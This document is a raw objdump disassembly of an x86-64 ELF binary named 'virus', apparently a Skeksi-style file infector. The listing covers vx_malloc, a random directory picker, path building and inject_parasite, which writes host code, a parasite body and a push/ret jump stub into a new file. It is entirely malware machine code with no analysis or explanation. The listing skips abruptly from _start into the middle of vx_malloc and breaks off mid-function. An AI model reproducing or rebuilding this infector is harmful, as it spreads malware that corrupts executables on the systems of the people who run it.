
./virus:     file format elf64-x86-64


Disassembly of section .text:

000000000040019c <_start>:
  40019c:	f3 0f 1e fa          	endbr64 
  40039e:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  4003a2:	48 8b 00             	mov    rax,QWORD PTR [rax]
  4003a5:	48 85 c0             	test   rax,rax
  4003a8:	75 46                	jne    4003f0 <vx_malloc+0x66>
  4003aa:	41 b9 00 00 00 00    	mov    r9d,0x0
  4003b0:	49 c7 c0 ff ff ff ff 	mov    r8,0xffffffffffffffff
  4003b7:	b9 22 00 00 00       	mov    ecx,0x22
  4003bc:	ba 03 00 00 00       	mov    edx,0x3
  4003c1:	be 00 00 20 00       	mov    esi,0x200000
  4003c6:	bf 00 00 00 00       	mov    edi,0x0
  4003cb:	e8 8d 1e 00 00       	call   40225d <_mmap>
  4003d0:	48 8b 55 f0          	mov    rdx,QWORD PTR [rbp-0x10]
  4003d4:	48 89 02             	mov    QWORD PTR [rdx],rax
  4003d7:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  4003db:	48 8b 00             	mov    rax,QWORD PTR [rax]
  4003de:	48 83 f8 ff          	cmp    rax,0xffffffffffffffff
  4003e2:	75 0c                	jne    4003f0 <vx_malloc+0x66>
  4003e4:	48 c7 c7 ff ff ff ff 	mov    rdi,0xffffffffffffffff
  4003eb:	e8 b2 1c 00 00       	call   4020a2 <Exit>
  4003f0:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  4003f4:	48 8b 00             	mov    rax,QWORD PTR [rax]
  4003f7:	48 8d 90 00 01 00 00 	lea    rdx,[rax+0x100]
  4003fe:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  400402:	48 89 10             	mov    QWORD PTR [rax],rdx
  400405:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  400409:	48 8b 00             	mov    rax,QWORD PTR [rax]
  40040c:	48 8b 55 f8          	mov    rdx,QWORD PTR [rbp-0x8]
  400410:	48 f7 da             	neg    rdx
  400413:	48 01 d0             	add    rax,rdx
  400416:	c9                   	leave  
  400417:	c3                   	ret    

0000000000400418 <_rand>:
  400418:	55                   	push   rbp
  400419:	48 89 e5             	mov    rbp,rsp
  40041c:	48 89 7d f8          	mov    QWORD PTR [rbp-0x8],rdi
  400420:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  400424:	48 8b 00             	mov    rax,QWORD PTR [rax]
  400427:	48 69 c0 6d 4e c6 41 	imul   rax,rax,0x41c64e6d
  40042e:	48 8d 90 39 30 00 00 	lea    rdx,[rax+0x3039]
  400435:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  400439:	48 89 10             	mov    QWORD PTR [rax],rdx
  40043c:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  400440:	48 8b 00             	mov    rax,QWORD PTR [rax]
  400443:	48 8d 90 ff ff 00 00 	lea    rdx,[rax+0xffff]
  40044a:	48 85 c0             	test   rax,rax
  40044d:	48 0f 48 c2          	cmovs  rax,rdx
  400451:	48 c1 f8 10          	sar    rax,0x10
  400455:	25 ff 7f 00 00       	and    eax,0x7fff
  40045a:	5d                   	pop    rbp
  40045b:	c3                   	ret    

000000000040045c <randomly_select_dir>:
  40045c:	55                   	push   rbp
  40045d:	48 89 e5             	mov    rbp,rsp
  400460:	48 83 ec 30          	sub    rsp,0x30
  400464:	48 89 7d d8          	mov    QWORD PTR [rbp-0x28],rdi
  400468:	c7 45 fc 04 00 00 00 	mov    DWORD PTR [rbp-0x4],0x4
  40046f:	48 8d 45 e0          	lea    rax,[rbp-0x20]
  400473:	be 00 00 00 00       	mov    esi,0x0
  400478:	48 89 c7             	mov    rdi,rax
  40047b:	e8 5a 1f 00 00       	call   4023da <_gettimeofday>
  400480:	48 8d 45 e0          	lea    rax,[rbp-0x20]
  400484:	48 83 c0 08          	add    rax,0x8
  400488:	48 89 c7             	mov    rdi,rax
  40048b:	e8 88 ff ff ff       	call   400418 <_rand>
  400490:	99                   	cdq    
  400491:	f7 7d fc             	idiv   DWORD PTR [rbp-0x4]
  400494:	89 d0                	mov    eax,edx
  400496:	89 c0                	mov    eax,eax
  400498:	48 8d 14 c5 00 00 00 	lea    rdx,[rax*8+0x0]
  40049f:	00 
  4004a0:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  4004a4:	48 01 d0             	add    rax,rdx
  4004a7:	48 8b 00             	mov    rax,QWORD PTR [rax]
  4004aa:	c9                   	leave  
  4004ab:	c3                   	ret    

00000000004004ac <full_path>:
  4004ac:	f3 0f 1e fa          	endbr64 
  4004b0:	55                   	push   rbp
  4004b1:	48 89 e5             	mov    rbp,rsp
  4004b4:	53                   	push   rbx
  4004b5:	48 83 ec 38          	sub    rsp,0x38
  4004b9:	48 89 7d d8          	mov    QWORD PTR [rbp-0x28],rdi
  4004bd:	48 89 75 d0          	mov    QWORD PTR [rbp-0x30],rsi
  4004c1:	48 89 55 c8          	mov    QWORD PTR [rbp-0x38],rdx
  4004c5:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  4004c9:	48 89 c7             	mov    rdi,rax
  4004cc:	e8 df 26 00 00       	call   402bb0 <_strlen>
  4004d1:	48 89 c3             	mov    rbx,rax
  4004d4:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
  4004d8:	48 89 c7             	mov    rdi,rax
  4004db:	e8 d0 26 00 00       	call   402bb0 <_strlen>
  4004e0:	48 01 d8             	add    rax,rbx
  4004e3:	48 8d 50 02          	lea    rdx,[rax+0x2]
  4004e7:	48 8b 45 c8          	mov    rax,QWORD PTR [rbp-0x38]
  4004eb:	48 89 c6             	mov    rsi,rax
  4004ee:	48 89 d7             	mov    rdi,rdx
  4004f1:	e8 94 fe ff ff       	call   40038a <vx_malloc>
  4004f6:	48 89 45 e8          	mov    QWORD PTR [rbp-0x18],rax
  4004fa:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  4004fe:	48 89 c7             	mov    rdi,rax
  400501:	e8 aa 26 00 00       	call   402bb0 <_strlen>
  400506:	89 c3                	mov    ebx,eax
  400508:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
  40050c:	48 89 c7             	mov    rdi,rax
  40050f:	e8 9c 26 00 00       	call   402bb0 <_strlen>
  400514:	8d 14 03             	lea    edx,[rbx+rax*1]
  400517:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  40051b:	be 00 00 00 00       	mov    esi,0x0
  400520:	48 89 c7             	mov    rdi,rax
  400523:	e8 33 1f 00 00       	call   40245b <Memset>
  400528:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
  40052c:	48 89 c7             	mov    rdi,rax
  40052f:	e8 7c 26 00 00       	call   402bb0 <_strlen>
  400534:	89 c2                	mov    edx,eax
  400536:	48 8b 4d d0          	mov    rcx,QWORD PTR [rbp-0x30]
  40053a:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  40053e:	48 89 ce             	mov    rsi,rcx
  400541:	48 89 c7             	mov    rdi,rax
  400544:	e8 bf 1e 00 00       	call   402408 <_memcpy>
  400549:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
  40054d:	48 89 c7             	mov    rdi,rax
  400550:	e8 5b 26 00 00       	call   402bb0 <_strlen>
  400555:	48 8b 55 e8          	mov    rdx,QWORD PTR [rbp-0x18]
  400559:	48 01 d0             	add    rax,rdx
  40055c:	c6 00 2f             	mov    BYTE PTR [rax],0x2f
  40055f:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  400563:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  400566:	3c 2e                	cmp    al,0x2e
  400568:	75 14                	jne    40057e <full_path+0xd2>
  40056a:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  40056e:	48 83 c0 01          	add    rax,0x1
  400572:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  400575:	3c 2f                	cmp    al,0x2f
  400577:	75 05                	jne    40057e <full_path+0xd2>
  400579:	48 83 45 d8 02       	add    QWORD PTR [rbp-0x28],0x2
  40057e:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  400582:	48 89 c7             	mov    rdi,rax
  400585:	e8 26 26 00 00       	call   402bb0 <_strlen>
  40058a:	89 c3                	mov    ebx,eax
  40058c:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
  400590:	48 89 c7             	mov    rdi,rax
  400593:	e8 18 26 00 00       	call   402bb0 <_strlen>
  400598:	48 8d 50 01          	lea    rdx,[rax+0x1]
  40059c:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  4005a0:	48 8d 0c 02          	lea    rcx,[rdx+rax*1]
  4005a4:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  4005a8:	89 da                	mov    edx,ebx
  4005aa:	48 89 c6             	mov    rsi,rax
  4005ad:	48 89 cf             	mov    rdi,rcx
  4005b0:	e8 53 1e 00 00       	call   402408 <_memcpy>
  4005b5:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  4005b9:	48 83 c4 38          	add    rsp,0x38
  4005bd:	5b                   	pop    rbx
  4005be:	5d                   	pop    rbp
  4005bf:	c3                   	ret    

00000000004005c0 <inject_parasite>:
  4005c0:	f3 0f 1e fa          	endbr64 
  4005c4:	55                   	push   rbp
  4005c5:	48 89 e5             	mov    rbp,rsp
  4005c8:	48 81 ec 30 01 00 00 	sub    rsp,0x130
  4005cf:	48 89 bd f8 fe ff ff 	mov    QWORD PTR [rbp-0x108],rdi
  4005d6:	48 89 b5 f0 fe ff ff 	mov    QWORD PTR [rbp-0x110],rsi
  4005dd:	48 89 95 e8 fe ff ff 	mov    QWORD PTR [rbp-0x118],rdx
  4005e4:	48 89 8d e0 fe ff ff 	mov    QWORD PTR [rbp-0x120],rcx
  4005eb:	4c 89 85 d8 fe ff ff 	mov    QWORD PTR [rbp-0x128],r8
  4005f2:	c7 45 fc 00 00 00 00 	mov    DWORD PTR [rbp-0x4],0x0
  4005f9:	c7 45 f8 40 00 00 00 	mov    DWORD PTR [rbp-0x8],0x40
  400600:	48 8b 85 e8 fe ff ff 	mov    rax,QWORD PTR [rbp-0x118]
  400607:	48 8b 40 50          	mov    rax,QWORD PTR [rax+0x50]
  40060b:	48 89 45 f0          	mov    QWORD PTR [rbp-0x10],rax
  40060f:	48 8b 85 e0 fe ff ff 	mov    rax,QWORD PTR [rbp-0x120]
  400616:	48 8b 40 50          	mov    rax,QWORD PTR [rax+0x50]
  40061a:	48 89 45 e8          	mov    QWORD PTR [rbp-0x18],rax
  40061e:	48 8b 85 e8 fe ff ff 	mov    rax,QWORD PTR [rbp-0x118]
  400625:	48 8b 40 60          	mov    rax,QWORD PTR [rax+0x60]
  400629:	48 89 45 e0          	mov    QWORD PTR [rbp-0x20],rax
  40062d:	48 8b 85 e8 fe ff ff 	mov    rax,QWORD PTR [rbp-0x118]
  400634:	48 8d 48 68          	lea    rcx,[rax+0x68]
  400638:	48 8d 85 10 ff ff ff 	lea    rax,[rbp-0xf0]
  40063f:	ba 90 00 00 00       	mov    edx,0x90
  400644:	48 89 ce             	mov    rsi,rcx
  400647:	48 89 c7             	mov    rdi,rax
  40064a:	e8 b9 1d 00 00       	call   402408 <_memcpy>
  40064f:	8b 85 28 ff ff ff    	mov    eax,DWORD PTR [rbp-0xd8]
  400655:	89 c0                	mov    eax,eax
  400657:	48 89 c2             	mov    rdx,rax
  40065a:	be 41 02 00 00       	mov    esi,0x241
  40065f:	48 8d 3d aa 27 00 00 	lea    rdi,[rip+0x27aa]        # 402e10 <display_skeksi+0x92>
  400666:	e8 56 1a 00 00       	call   4020c1 <_open>
  40066b:	89 45 dc             	mov    DWORD PTR [rbp-0x24],eax
  40066e:	83 7d dc ff          	cmp    DWORD PTR [rbp-0x24],0xffffffff
  400672:	75 0a                	jne    40067e <inject_parasite+0xbe>
  400674:	b8 ff ff ff ff       	mov    eax,0xffffffff
  400679:	e9 de 01 00 00       	jmp    40085c <inject_parasite+0x29c>
  40067e:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400681:	48 63 d0             	movsxd rdx,eax
  400684:	8b 45 dc             	mov    eax,DWORD PTR [rbp-0x24]
  400687:	48 98                	cdqe   
  400689:	48 8b 4d f0          	mov    rcx,QWORD PTR [rbp-0x10]
  40068d:	48 89 ce             	mov    rsi,rcx
  400690:	48 89 c7             	mov    rdi,rax
  400693:	e8 b3 1a 00 00       	call   40214b <_write>
  400698:	89 45 d8             	mov    DWORD PTR [rbp-0x28],eax
  40069b:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  40069e:	39 45 d8             	cmp    DWORD PTR [rbp-0x28],eax
  4006a1:	74 0a                	je     4006ad <inject_parasite+0xed>
  4006a3:	b8 ff ff ff ff       	mov    eax,0xffffffff
  4006a8:	e9 af 01 00 00       	jmp    40085c <inject_parasite+0x29c>
  4006ad:	e8 90 26 00 00       	call   402d42 <get_rip>
  4006b2:	48 c7 c2 4f 2d 40 00 	mov    rdx,0x402d4f
  4006b9:	48 89 d1             	mov    rcx,rdx
  4006bc:	48 c7 c2 5d 2d 40 00 	mov    rdx,0x402d5d
  4006c3:	48 29 d1             	sub    rcx,rdx
  4006c6:	48 89 ca             	mov    rdx,rcx
  4006c9:	48 29 d0             	sub    rax,rdx
  4006cc:	48 89 45 d0          	mov    QWORD PTR [rbp-0x30],rax
  4006d0:	e8 6d 26 00 00       	call   402d42 <get_rip>
  4006d5:	48 c7 c2 4f 2d 40 00 	mov    rdx,0x402d4f
  4006dc:	48 89 d1             	mov    rcx,rdx
  4006df:	48 c7 c2 72 2d 40 00 	mov    rdx,0x402d72
  4006e6:	48 29 d1             	sub    rcx,rdx
  4006e9:	48 89 ca             	mov    rdx,rcx
  4006ec:	48 29 d0             	sub    rax,rdx
  4006ef:	48 89 45 c8          	mov    QWORD PTR [rbp-0x38],rax
  4006f3:	48 8b 45 c8          	mov    rax,QWORD PTR [rbp-0x38]
  4006f7:	48 2b 45 d0          	sub    rax,QWORD PTR [rbp-0x30]
  4006fb:	89 45 c4             	mov    DWORD PTR [rbp-0x3c],eax
  4006fe:	e8 3f 26 00 00       	call   402d42 <get_rip>
  400703:	48 c7 c2 4f 2d 40 00 	mov    rdx,0x402d4f
  40070a:	48 89 d1             	mov    rcx,rdx
  40070d:	48 c7 c2 5d 2d 40 00 	mov    rdx,0x402d5d
  400714:	48 29 d1             	sub    rcx,rdx
  400717:	48 89 ca             	mov    rdx,rcx
  40071a:	48 29 d0             	sub    rax,rdx
  40071d:	48 89 45 b8          	mov    QWORD PTR [rbp-0x48],rax
  400721:	c7 85 0a ff ff ff 68 	mov    DWORD PTR [rbp-0xf6],0x68
  400728:	00 00 00 
  40072b:	66 c7 85 0e ff ff ff 	mov    WORD PTR [rbp-0xf2],0xc300
  400732:	00 c3 
  400734:	48 8d 85 0a ff ff ff 	lea    rax,[rbp-0xf6]
  40073b:	48 83 c0 01          	add    rax,0x1
  40073f:	48 8b 95 d8 fe ff ff 	mov    rdx,QWORD PTR [rbp-0x128]
  400746:	89 10                	mov    DWORD PTR [rax],edx
  400748:	48 8b 85 e0 fe ff ff 	mov    rax,QWORD PTR [rbp-0x120]
  40074f:	48 8b 40 58          	mov    rax,QWORD PTR [rax+0x58]
  400753:	48 2d 68 42 00 00    	sub    rax,0x4268
  400759:	48 89 45 b0          	mov    QWORD PTR [rbp-0x50],rax
  40075d:	8b 45 c4             	mov    eax,DWORD PTR [rbp-0x3c]
  400760:	48 98                	cdqe   
  400762:	48 29 45 b0          	sub    QWORD PTR [rbp-0x50],rax
  400766:	8b 45 dc             	mov    eax,DWORD PTR [rbp-0x24]
  400769:	48 98                	cdqe   
  40076b:	48 8b 55 b0          	mov    rdx,QWORD PTR [rbp-0x50]
  40076f:	48 8b 4d e8          	mov    rcx,QWORD PTR [rbp-0x18]
  400773:	48 89 ce             	mov    rsi,rcx
  400776:	48 89 c7             	mov    rdi,rax
  400779:	e8 cd 19 00 00       	call   40214b <_write>
  40077e:	89 45 d8             	mov    DWORD PTR [rbp-0x28],eax
  400781:	8b 45 d8             	mov    eax,DWORD PTR [rbp-0x28]
  400784:	48 39 45 b0          	cmp    QWORD PTR [rbp-0x50],rax
  400788:	74 0a                	je     400794 <inject_parasite+0x1d4>
  40078a:	b8 ff ff ff ff       	mov    eax,0xffffffff
  40078f:	e9 c8 00 00 00       	jmp    40085c <inject_parasite+0x29c>
  400794:	8b 45 dc             	mov    eax,DWORD PTR [rbp-0x24]
  400797:	48 98                	cdqe   
  400799:	48 8d 8d 0a ff ff ff 	lea    rcx,[rbp-0xf6]
  4007a0:	ba 06 00 00 00       	mov    edx,0x6
  4007a5:	48 89 ce             	mov    rsi,rcx
  4007a8:	48 89 c7             	mov    rdi,rax
  4007ab:	e8 9b 19 00 00       	call   40214b <_write>
  4007b0:	8b 45 c4             	mov    eax,DWORD PTR [rbp-0x3c]
  4007b3:	48 98                	cdqe   
  4007b5:	48 8d 90 62 42 00 00 	lea    rdx,[rax+0x4262]
  4007bc:	48 8b 45 b0          	mov    rax,QWORD PTR [rbp-0x50]
  4007c0:	48 8d 48 06          	lea    rcx,[rax+0x6]
  4007c4:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  4007c8:	48 01 c1             	add    rcx,rax
  4007cb:	8b 45 dc             	mov    eax,DWORD PTR [rbp-0x24]
  4007ce:	48 98                	cdqe   
  4007d0:	48 89 ce             	mov    rsi,rcx
  4007d3:	48 89 c7             	mov    rdi,rax
  4007d6:	e8 70 19 00 00       	call   40214b <_write>
  4007db:	48 8b 85 f0 fe ff ff 	mov    rax,QWORD PTR [rbp-0x110]
  4007e2:	83 c0 40             	add    eax,0x40
  4007e5:	89 45 ac             	mov    DWORD PTR [rbp-0x54],eax
  4007e8:	8b 4d ac             	mov    ecx,DWORD PTR [rbp-0x54]
  4007eb:	8b 45 dc             	mov    eax,DWORD PTR [rbp-0x24]
  4007ee:	48 98                	cdqe   
  4007f0:	ba 00 00 00 00       	mov    edx,0x0
  4007f5:	48 89 ce             	mov    rsi,rcx
  4007f8:	48 89 c7             	mov    rdi,rax
  4007fb:	e8 03 1a 00 00       	call   402203 <_lseek>
  400800:	89 45 d8             	mov    DWORD PTR [rbp-0x28],eax
  400803:	8b 45 d8             	mov    eax,DWORD PTR [rbp-0x28]
  400806:	3b 45 ac             	cmp    eax,DWORD PTR [rbp-0x54]
  400809:	74 07                	je     400812 <inject_parasite+0x252>
  40080b:	b8 ff ff ff ff       	mov    eax,0xffffffff
